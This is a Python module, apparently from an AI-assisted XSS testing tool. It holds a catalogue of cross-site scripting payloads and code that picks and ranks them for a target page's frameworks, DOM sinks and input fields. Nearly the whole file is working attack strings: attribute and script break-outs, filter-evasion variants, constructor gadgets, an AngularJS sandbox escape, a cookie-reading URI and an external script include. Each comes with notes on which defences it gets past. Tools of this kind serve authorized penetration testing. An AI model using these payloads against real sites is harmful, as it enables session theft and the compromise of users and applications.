from __future__ import annotations

from dataclasses import replace

from ai_xss_generator.types import ParsedContext, PayloadCandidate


BASE_PAYLOADS: list[PayloadCandidate] = [
    PayloadCandidate(
        payload="\"><svg/onload=alert(document.domain)>",
        title="SVG onload break-out",
        explanation="Breaks out of an HTML attribute and pivots to an auto-firing SVG handler.",
        test_vector="Inject into reflected attribute or query parameter rendered into HTML.",
        tags=["polyglot", "attribute-breakout", "auto-trigger"],
    ),
    PayloadCandidate(
        payload="<img src=x onerror=alert(1)>",
        title="Classic image error",
        explanation="Useful against raw HTML insertion via innerHTML or template rendering.",
        test_vector="Send through fields reflected into DOM sink or server-side template.",
        tags=["dom", "html", "onerror"],
    ),
    PayloadCandidate(
        payload="<svg><script>alert(1)</script>",
        title="SVG script block",
        explanation="Works against sinks that preserve SVG or XML-ish fragments.",
        test_vector="Try in rich text or unsafely sanitized SVG upload/preview flows.",
        tags=["svg", "script-tag", "polyglot"],
    ),
    PayloadCandidate(
        payload="javascript:alert(document.cookie)",
        title="Protocol handler URI",
        explanation="Targets href/src assignments or framework bindings writing dangerous URLs.",
        test_vector="Inject into link inputs, router params, or href property sinks.",
        tags=["uri", "protocol", "href"],
    ),
    PayloadCandidate(
        payload="';alert(String.fromCharCode(88,83,83))//",
        title="Single-quote JS break-out",
        explanation="Escapes string literals that land in eval, setTimeout, or inline handlers.",
        test_vector="Use in query fragments or form inputs copied into JS strings.",
        tags=["js-context", "quote-breakout", "eval"],
    ),
    PayloadCandidate(
        payload="</script><script>alert(1)</script>",
        title="Script tag close-and-reopen",
        explanation="Closes an existing script context and starts a fresh executable block.",
        test_vector="Try where user content is embedded directly in a script tag.",
        tags=["script-context", "close-tag", "dom"],
    ),
    PayloadCandidate(
        payload="&#x3c;img src=x onerror=alert(1)&#x3e;",
        title="HTML-encoded image error",
        explanation="Bypasses weak filters that decode entities before inserting into HTML.",
        test_vector="Useful when input is entity-encoded once before rendering.",
        tags=["encoding", "html-entity", "evasion"],
    ),
    PayloadCandidate(
        payload="<details open ontoggle=alert(1)>",
        title="Details toggle auto-fire",
        explanation="Triggers without click in some rendering paths once the element is opened.",
        test_vector="Use where tag allowlists keep uncommon interactive elements.",
        tags=["html", "event", "evasion"],
    ),
    PayloadCandidate(
        payload="<math><mtext><img src=x onerror=alert(1)>",
        title="MathML wrapper",
        explanation="Targets sanitizers that overlook MathML namespaced content.",
        test_vector="Test on rich HTML sinks with partial allowlists.",
        tags=["mathml", "polyglot", "evasion"],
    ),
    PayloadCandidate(
        payload="Set.constructor`alert\\x281\\x29`()",
        title="Template literal constructor gadget",
        explanation="A no-parentheses variant for JS execution in template-literal-friendly sinks.",
        test_vector="Try in script expressions or framework expression injections.",
        tags=["constructor", "template-literal", "evasion"],
    ),
    PayloadCandidate(
        payload="jaVasCript:alert(1)",
        title="Case-variant javascript URI",
        explanation="Bypasses naive lowercase-only deny checks on protocol handlers.",
        test_vector="Inject into href or router-link style bindings.",
        tags=["uri", "case-variant", "evasion"],
    ),
    PayloadCandidate(
        payload="\\u003cimg src=x onerror=alert(1)\\u003e",
        title="Unicode escaped HTML",
        explanation="Useful when a JS string is later decoded and assigned into innerHTML.",
        test_vector="Send into JSON/JS contexts that later hydrate DOM.",
        tags=["unicode", "js-string", "dom"],
    ),
    PayloadCandidate(
        payload="[]['filter']['constructor']('alert(1)')()",
        title="Constructor chain gadget",
        explanation="Useful when `eval` is filtered but Function constructor gadgets are reachable.",
        test_vector="Target client-side JS expressions or template engines.",
        tags=["constructor", "jsfuck-ish", "eval-bypass"],
    ),
    PayloadCandidate(
        payload="<iframe srcdoc='<script>alert(1)</script>'>",
        title="srcdoc iframe",
        explanation="Triggers where arbitrary HTML is allowed but direct script tags are filtered.",
        test_vector="Try in innerHTML sinks with relaxed tag stripping.",
        tags=["iframe", "srcdoc", "html"],
    ),
    PayloadCandidate(
        payload="--><img src=x onerror=alert(1)>",
        title="Comment break-out",
        explanation="Useful when attacker input lands inside an HTML comment before rendering.",
        test_vector="Try against debug comments and hidden template fragments.",
        tags=["comment-breakout", "html", "onerror"],
    ),
    PayloadCandidate(
        payload="<a autofocus onfocus=alert(1) tabindex=1>x</a>",
        title="Autofocus anchor",
        explanation="Useful when interaction is limited but autofocus is preserved.",
        test_vector="Inject into HTML fragments inserted on page load.",
        tags=["autofocus", "focus", "event"],
    ),
    PayloadCandidate(
        payload="${alert(1)}",
        title="Template expression probe",
        explanation="Targets client-side template injections in Vue, AngularJS, and similar stacks.",
        test_vector="Inject into interpolation slots or template-bound attributes.",
        tags=["template-injection", "framework", "expression"],
    ),
    PayloadCandidate(
        payload="';top['al'+'ert'](1);//",
        title="Concatenated alert call",
        explanation="Avoids exact keyword matching inside JS string break-outs.",
        test_vector="Try where alert/eval are blocked by simplistic regex filters.",
        tags=["js-context", "concat", "evasion"],
    ),
    PayloadCandidate(
        payload="</title><svg/onload=alert(1)>",
        title="Title tag escape",
        explanation="Useful when user input lands inside title or metadata tags.",
        test_vector="Inject into search pages or dynamic titles.",
        tags=["metadata", "svg", "close-tag"],
    ),
    PayloadCandidate(
        payload="<form><button formaction=javascript:alert(1)>go</button></form>",
        title="Form action protocol gadget",
        explanation="Targets environments that validate anchors but not form actions.",
        test_vector="Try in form builders or HTML editors.",
        tags=["form", "protocol", "html"],
    ),
    PayloadCandidate(
        payload="x' onmouseover='alert(1)' x='",
        title="Inline handler splice",
        explanation="Breaks into existing attributes and inserts a new event handler.",
        test_vector="Inject into quoted attribute values and hover-enabled widgets.",
        tags=["attribute-breakout", "event-handler", "quoted"],
    ),
    PayloadCandidate(
        payload="';document.body.innerHTML='<img src=x onerror=alert(1)>'//",
        title="Script-to-DOM chain",
        explanation="Turns a JS string breakout into a secondary innerHTML sink for persistence.",
        test_vector="Best against data copied into setTimeout/eval or inline script blocks.",
        tags=["chain", "innerHTML", "js-context"],
    ),
    PayloadCandidate(
        payload='"><script src=//example.invalid/xss.js></script>',
        title="External script include probe",
        explanation="Useful for controlled callbacks during manual testing if CSP is weak.",
        test_vector="Only use against authorized targets with controlled listener infra.",
        tags=["external-script", "callback", "probe"],
    ),
    PayloadCandidate(
        payload="<object data='data:text/html,<script>alert(1)</script>'></object>",
        title="Data URI object embed",
        explanation="Can survive filters that only inspect outer tags.",
        test_vector="Try in HTML preview widgets that allow embedded objects.",
        tags=["data-uri", "object", "html"],
    ),
]


def _framework_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    frameworks = {framework.lower() for framework in context.frameworks}
    if "react" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload='{"__html":"<img src=x onerror=alert(1)>"}',
                title="React dangerouslySetInnerHTML probe",
                explanation="Targets components that pass attacker-controlled content into `dangerouslySetInnerHTML`.",
                test_vector="Inject into props or JSON blobs feeding rich preview components.",
                tags=["react", "dangerouslySetInnerHTML", "dom"],
                framework_hint="React",
                target_sink="dangerouslySetInnerHTML",
            )
        )
    if "vue" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload='{{constructor.constructor("alert(1)")()}}',
                title="Vue expression gadget",
                explanation="Probes template-expression injection in older Vue or unsafe compiler flows.",
                test_vector="Inject into user-controlled template fragments or runtime-compiled components.",
                tags=["vue", "expression", "constructor"],
                framework_hint="Vue",
            )
        )
    if "angular" in frameworks or "angularjs" in frameworks:
        payloads.append(
            PayloadCandidate(
                payload="{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
                title="AngularJS sandbox escape probe",
                explanation="Targets legacy AngularJS expression contexts with weak sandboxing.",
                test_vector="Use only if interpolation lands inside AngularJS templates.",
                tags=["angularjs", "sandbox-escape", "expression"],
                framework_hint="AngularJS",
            )
        )
    return payloads


def _sink_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    sink_names = {sink.sink.lower() for sink in context.dom_sinks}
    if "innerhtml" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                title="innerHTML SVG animate",
                explanation="Useful where innerHTML accepts SVG but strips plain script blocks.",
                test_vector="Inject into DOM content assignments or HTML preview widgets.",
                tags=["innerHTML", "svg", "animate"],
                target_sink="innerHTML",
            )
        )
    if "eval" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="');Function('alert(1)')();//",
                title="Eval-to-Function chain",
                explanation="Escapes a string passed to eval and falls into a secondary execution primitive.",
                test_vector="Use in query or hash data copied into eval-based routers.",
                tags=["eval", "function-constructor", "js-context"],
                target_sink="eval",
            )
        )
    if "settimeout" in sink_names or "setinterval" in sink_names:
        payloads.append(
            PayloadCandidate(
                payload="alert?.(1)//",
                title="Timer string execution probe",
                explanation="Small payload for timer callbacks passed as strings.",
                test_vector="Try where input is concatenated into setTimeout or setInterval.",
                tags=["timer", "js-context", "short"],
                target_sink="setTimeout",
            )
        )
    return payloads


def _input_payloads(context: ParsedContext) -> list[PayloadCandidate]:
    payloads: list[PayloadCandidate] = []
    for input_field in context.inputs[:6]:
        descriptor = input_field.name or input_field.id_value or input_field.tag
        payloads.append(
            PayloadCandidate(
                payload=f"seed:{descriptor}:<svg/onload=alert(1)>",
                title=f"Field-specific probe for {descriptor}",
                explanation="Tracks reflection path per field while still carrying an executable payload.",
                test_vector=f"Submit through `{descriptor}` and observe reflected path or DOM mutation.",
                tags=["field-specific", "tracing", input_field.input_type or "input"],
            )
        )
    return payloads


def base_payloads_for_context(context: ParsedContext) -> list[PayloadCandidate]:
    payloads = list(BASE_PAYLOADS)
    payloads.extend(_framework_payloads(context))
    payloads.extend(_sink_payloads(context))
    payloads.extend(_input_payloads(context))
    return payloads


def score_payload(payload: PayloadCandidate, context: ParsedContext) -> int:
    score = 25
    text = payload.payload.lower()
    sink_names = {sink.sink.lower() for sink in context.dom_sinks}
    frameworks = {framework.lower() for framework in context.frameworks}
    handlers = {handler.lower() for handler in context.event_handlers}

    if any(keyword in text for keyword in ("innerhtml", "<img", "<svg", "<iframe", "<math", "<object")):
        score += 15
    if any(sink in payload.tags or sink == payload.target_sink.lower() for sink in sink_names):
        score += 20
    if "eval" in sink_names and any(keyword in text for keyword in ("function(", "constructor", "alert?.(", "set.constructor")):
        score += 18
    if "react" in frameworks and "react" in (payload.framework_hint or "").lower():
        score += 18
    if "vue" in frameworks and "vue" in (payload.framework_hint or "").lower():
        score += 18
    if ("angular" in frameworks or "angularjs" in frameworks) and "angular" in (payload.framework_hint or "").lower():
        score += 18
    if any(tag in payload.tags for tag in ("polyglot", "chain", "evasion")):
        score += 10
    if any(handler.replace("on", "") in text for handler in handlers):
        score += 8
    if context.forms:
        score += min(10, len(context.forms) * 2)
    if "javascript:" in text:
        score += 8
    if "seed:" in text:
        score -= 5
    return max(1, min(score, 100))


def dedupe_payloads(payloads: list[PayloadCandidate]) -> list[PayloadCandidate]:
    unique: dict[str, PayloadCandidate] = {}
    for payload in payloads:
        existing = unique.get(payload.payload)
        if existing is None or payload.risk_score > existing.risk_score:
            unique[payload.payload] = payload
    return list(unique.values())


def rank_payloads(payloads: list[PayloadCandidate], context: ParsedContext) -> list[PayloadCandidate]:
    scored: list[PayloadCandidate] = []
    for payload in dedupe_payloads(payloads):
        scored.append(replace(payload, risk_score=score_payload(payload, context)))
    return sorted(scored, key=lambda item: (-item.risk_score, item.payload))
